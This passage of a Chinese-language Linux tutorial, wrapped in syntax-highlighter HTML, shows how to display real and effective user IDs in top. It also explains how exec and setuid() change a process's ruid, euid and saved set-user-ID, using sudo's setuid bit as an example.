</span><span class=\"crayon-i\">SHR</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">CPU</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-e\">MEM    </span><span class=\"crayon-v\">TIME</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">COMMAND</span><span class=\"crayon-h\">                                                                                </span></div><div class=\"crayon-line\" id=\"crayon-5b4a92874b3c7576804153-9\"><span class=\"crayon-cn\">31603</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">miracle</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">20</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2368m</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">681m</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">52m</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">S</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">6</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">9.1</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">206</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">07.74</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">firefox</span><span class=\"crayon-h\">                                                                                </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3c7576804153-10\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1507</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">20</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">451m</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">188m</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">97m</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">S</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">2.5</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">193</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">49.86</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Xorg</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b4a92874b3c7576804153-11\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0047 seconds] -->\r\n<br>\n这里通过 <code>-d</code> 选项延长 <code>top</code> 的刷新频率便于操作。此处可见，只有 <code>USER</code> 字段，表示相应进程的 <code>effective user id</code>.</li>\n<li>打开 <code>read user id</code> 的显示选项\n<ol>\n<li>在 <code>top</code> 命令运行期间，输入 <code>f</code>, 可以看见类似如下行：<br>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92874b3cc855681197\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nc: RUSER      = Real user name</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3cc855681197-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92874b3cc855681197-1\"><span class=\"crayon-v\">c</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">RUSER</span><span class=\"crayon-h\">      </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Real </span><span class=\"crayon-e\">user </span><span class=\"crayon-v\">name</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n\n</li>\n<li>输入 <code>c</code> 即可打开 <code>Real user name</code> 的显示开关。<br>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92874b3cf073589605\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n* C: RUSER      = Real user name</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3cf073589605-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92874b3cf073589605-1\"><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">C</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">RUSER</span><span class=\"crayon-h\">      </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Real </span><span class=\"crayon-e\">user </span><span class=\"crayon-v\">name</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n\n</li>\n<li>最后 <code>Return</code> 回车回到 <code>top</code> 中，即可看到 <code>real user id</code> 的选项此时输入 <code>o</code>,可调整列次序最终我们可看到包含 <code>effective user id</code> 和 <code>real user id</code> 的输出如下：<br>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92874b3d2608327680\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntop - 15:57:58 up 9 days,  1:49,  9 users,  load average: 0.23, 0.22, 0.23\r\nTasks: 286 total,   1 running, 284 sleeping,   0 stopped,   1 zombie\r\nCpu(s):  3.9%us,  1.4%sy,  0.0%ni, 94.6%id,  0.1%wa,  0.0%hi,  0.0%si,  0.0%st\r\nMem:   7707276k total,  7539776k used,   167500k free,   154996k buffers\r\nSwap:  1998844k total,   225132k used,  1773712k free,  3300036k cached\r\n\r\n  PID USER     RUSER     PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND                              \r\n31603 miracle  miracle   20   0 2376m 688m  52m S    4  9.2 206:24.14 firefox                    \r\n 1507 root     root      20   0  451m 188m  97m S    3  2.5 194:06.27 Xorg  \r\n ....</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3d2608327680-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3d2608327680-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3d2608327680-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3d2608327680-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3d2608327680-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3d2608327680-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3d2608327680-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3d2608327680-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3d2608327680-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3d2608327680-10\">10</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92874b3d2608327680-1\"><span class=\"crayon-v\">top</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">57</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">58</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">up</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">days</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">49</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">9</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">users</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-e\">load </span><span class=\"crayon-v\">average</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.23</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.22</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.23</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3d2608327680-2\"><span class=\"crayon-v\">Tasks</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">286</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">total</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">running</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">284</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sleeping</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">stopped</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">zombie</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92874b3d2608327680-3\"><span class=\"crayon-e\">Cpu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">s</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">3.9</span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">us</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1.4</span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">sy</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">ni</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">94.6</span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0.1</span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">wa</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">hi</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">si</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-o\">%</span><span class=\"crayon-e\">st</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3d2608327680-4\"><span class=\"crayon-v\">Mem</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">7707276k</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">total</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">7539776k</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">used</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">167500k</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">free</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">154996k</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">buffers</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92874b3d2608327680-5\"><span class=\"crayon-v\">Swap</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1998844k</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">total</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">225132k</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">used</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1773712k</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">free</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">3300036k</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cached</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3d2608327680-6\"> </div><div class=\"crayon-line\" id=\"crayon-5b4a92874b3d2608327680-7\"><span class=\"crayon-e\">  </span><span class=\"crayon-e\">PID </span><span class=\"crayon-e\">USER     </span><span class=\"crayon-e\">RUSER     </span><span class=\"crayon-e\">PR  </span><span class=\"crayon-e\">NI  </span><span class=\"crayon-e\">VIRT  </span><span class=\"crayon-e\">RES  </span><span class=\"crayon-i\">SHR</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">CPU</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-e\">MEM    </span><span class=\"crayon-v\">TIME</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">  </span><span class=\"crayon-i\">COMMAND</span><span class=\"crayon-h\">                              </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3d2608327680-8\"><span class=\"crayon-cn\">31603</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">miracle  </span><span class=\"crayon-i\">miracle</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">20</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2376m</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">688m</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">52m</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">S</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">9.2</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">206</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">24.14</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">firefox</span><span class=\"crayon-h\">                    </span></div><div class=\"crayon-line\" id=\"crayon-5b4a92874b3d2608327680-9\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1507</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root     </span><span class=\"crayon-i\">root</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">20</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">451m</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">188m</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">97m</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">S</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">2.5</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">194</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">06.27</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Xorg</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3d2608327680-10\"><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0045 seconds] -->\r\n<br>\n其中， <code>PID</code> 是对应进程， <code>USER</code> 是对应的 <code>effective user</code>, <code>RUSER</code> 是对应的 <code>real user</code> 。</li>\n</ol>\n</li>\n</ol>\n<h3>进程访问文件的权限控制策略<a id=\"orgheadline21\"></a></h3>\n<h4>规则<a id=\"orgheadline16\"></a></h4>\n<h5>进程访问文件大致权限控制策略<a id=\"orgheadline13\"></a></h5>\n<p>对于进程访问文件而言，最重要的是 <code>euid</code>, 所以其权限属性均以 <code>euid</code> 为 “中心”。</p>\n<ul>\n<li>进程的 <code>euid</code> 一般默认即为 其 <code>ruid</code> 值</li>\n<li>若可执行文件的可执行权限位为 <code>s</code> ，进程对其调用 <code>exec</code> 后，其 <code>euid</code> 被设置为该可执行文件的 <code>user id</code></li>\n<li>进程的 <code>saved set user id</code> 拷贝自 <code>euid</code>.</li>\n<li>当进程的 <code>euid</code> 与文件的 <code>user id</code> 匹配时，进程才具有文件 <code>user</code> 权限位所设定的权限</li>\n<li>组权限 <code>egid</code> 的控制规则类似。</li>\n</ul>\n<h5>通过 <code>exec</code> 执行文件修改权限属性<a id=\"orgheadline14\"></a></h5>\n<p>通过 <code>exec</code> 调用可执行文件之时：</p>\n<ul>\n<li>进程 <code>ruid</code> 值始终不变；</li>\n<li><code>saved set-user ID</code> 始终来自 <code>euid</code> ；</li>\n<li><code>euid</code> 值取决于文件的 <code>set-user-ID</code> 位是否被设置。</li>\n</ul>\n<p>如下：</p>\n<table border=\"2\" frame=\"hsides\" rules=\"groups\" cellspacing=\"0\" cellpadding=\"6\">\n<colgroup>\n<col class=\"org-left\">\n<col class=\"org-left\">\n<col class=\"org-left\"> </colgroup>\n<thead>\n<tr>\n<th class=\"org-left\" scope=\"col\">ID</th>\n<th class=\"org-left\" scope=\"col\">set-user-ID bit off</th>\n<th class=\"org-left\" scope=\"col\">set-user-ID bit on</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td class=\"org-left\">real user ID</td>\n<td class=\"org-left\">unchanged</td>\n<td class=\"org-left\">unchanged</td>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td class=\"org-left\">effective user ID</td>\n<td class=\"org-left\">unchanged</td>\n<td class=\"org-left\">set from userID of program file</td>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td class=\"org-left\">saved set-user ID</td>\n<td class=\"org-left\">copied from effective user ID</td>\n<td class=\"org-left\">copied from effective user ID</td>\n</tr>\n</tbody>\n</table>\n<h5>通过 <code>setuid(uid)</code> 系统调用修改权限属性<a id=\"orgheadline15\"></a></h5>\n<p>通过 <code>setuid(uid)</code> 修改权限属性之时：</p>\n<ul>\n<li><code>superuser</code> 可顺利修改 <code>ruid</code>, <code>euid</code>, <code>saved set-user ID</code> ；</li>\n<li><code>unprivileged user</code> 只能在 <code>uid</code> 与 <code>ruid</code> 相等时修改 <code>euid</code>, 其它无法修改。</li>\n</ul>\n<p>如下：</p>\n<table border=\"2\" frame=\"hsides\" rules=\"groups\" cellspacing=\"0\" cellpadding=\"6\">\n<colgroup>\n<col class=\"org-left\">\n<col class=\"org-left\">\n<col class=\"org-left\"> </colgroup>\n<thead>\n<tr>\n<th class=\"org-left\" scope=\"col\">ID</th>\n<th class=\"org-left\" scope=\"col\">superuser</th>\n<th class=\"org-left\" scope=\"col\">unprivileged user</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td class=\"org-left\">real user ID</td>\n<td class=\"org-left\">set to uid</td>\n<td class=\"org-left\">unchanged</td>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td class=\"org-left\">effective user ID</td>\n<td class=\"org-left\">set to uid</td>\n<td class=\"org-left\">set to uid</td>\n</tr>\n</tbody>\n<tbody>\n<tr>\n<td class=\"org-left\">saved set-user ID</td>\n<td class=\"org-left\">set to uid</td>\n<td class=\"org-left\">unchanged</td>\n</tr>\n</tbody>\n</table>\n<h4>举例<a id=\"orgheadline20\"></a></h4>\n<p>再举几个比较特别的例子：</p>\n<h5>设置了 <code>set-user-id</code><a id=\"orgheadline17\"></a></h5>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92874b3d8790292149\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ls -l /usr/bin/sudo\r\n-rwsr-xr-x 1 root root 71288  2月 28  2013 /usr/bin/sudo</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92874b3d8790292149-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92874b3d8790292149-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92874b3d8790292149-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sudo</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92874b3d8790292149-2\"><span class=\"crayon-o\">-</span><span 